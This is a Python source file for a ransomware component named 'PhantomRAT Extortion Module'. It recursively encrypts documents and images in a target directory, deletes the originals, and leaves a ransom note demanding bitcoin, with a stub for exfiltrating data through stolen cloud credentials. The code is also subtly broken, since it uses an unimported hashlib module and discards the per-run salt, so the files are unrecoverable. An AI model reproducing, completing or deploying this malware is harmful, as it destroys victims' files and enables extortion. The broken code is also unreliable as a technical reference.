#!/usr/bin/env python3
"""
PhantomRAT Extortion Module
Handles file encryption and ransom demands.
"""

import os
import base64
import json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Load profile
with open('malleable_profile.json', 'r') as f:
    PROFILE = json.load(f)

ENCRYPTION_KEY = b"phantomrat_32_char_encryption_key_here"
FERNET_KEY = base64.urlsafe_b64encode(hashlib.sha256(ENCRYPTION_KEY).digest())
CIPHER = Fernet(FERNET_KEY)

def generate_ransom_key():
    """Generate a unique key for encryption"""
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(ENCRYPTION_KEY))
    return key

def encrypt_files(target_dir, file_extensions=['.txt', '.docx', '.pdf', '.jpg']):
    """Encrypt files in target directory"""
    key = generate_ransom_key()
    cipher = Fernet(key)
    encrypted_count = 0
    
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if any(file.endswith(ext) for ext in file_extensions):
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    encrypted = cipher.encrypt(data)
                    with open(filepath + '.encrypted', 'wb') as f:
                        f.write(encrypted)
                    os.remove(filepath)  # Remove original
                    encrypted_count += 1
                except:
                    pass
    
    # Save ransom note
    ransom_note = f"""
    Your files have been encrypted by PhantomRAT.
    To recover, pay 1 BTC to: [placeholder_wallet].
    Contact: phantom@onionmail.org
    Key ID: {key.decode()[:10]}...
    """
    with open(os.path.join(target_dir, 'RANSOM_NOTE.txt'), 'w') as f:
        f.write(ransom_note)
    
    return f"Encrypted {encrypted_count} files. Ransom note placed."

def exfil_via_cloud(data, creds=None):
    """Exfiltrate via cloud storage using stolen creds"""
    if not creds:
        creds = PROFILE.get('cloud_creds', {})
    
    # Placeholder for cloud upload (e.g., Dropbox, Google Drive)
    # Use creds to upload encrypted data
    return "Data exfiltrated to cloud"

def perform_extortion(target_dir='/home/user', extensions=None):
    """Main extortion function"""
    if extensions is None:
        extensions = ['.txt', '.doc', '.pdf', '.jpg', '.png']
    
    result = encrypt_files(target_dir, extensions)
    # Optionally exfil keys or data
    exfil_result = exfil_via_cloud({'ransom_key': 'placeholder'})
    return f"{result} | {exfil_result}"

if __name__ == '__main__':
    print(perform_extortion())
